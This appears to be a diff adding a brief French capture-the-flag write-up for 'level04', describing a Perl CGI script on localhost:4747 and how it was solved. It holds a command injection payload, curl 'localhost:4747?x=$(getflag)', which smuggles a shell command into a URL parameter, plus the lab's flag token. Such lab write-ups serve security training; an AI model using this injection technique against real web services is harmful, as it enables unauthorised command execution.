@@ -1,0 +1,21 @@
+Explications : 
+
+On trouve level04.pl
+
+Lorsqu'on ouvre le fichier on voit une ligne 
+
+# localhost:4747
+
+Etant donne qu'on connait pas le perl, on a traduit le fichier en C 
+
+Ce qui nous a permis de comprendre que le fichier parsait des parametres avec ? et = 
+
+Lorsqu'on execute ./level04.pl ?x=coucou ca print coucou 
+
+On essaie de faire avec getflag, mais ca print getflag
+
+Et si on fait avec curl on recuperer le flag 
+
+curl 'localhost:4747?x=$(getflag)'
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
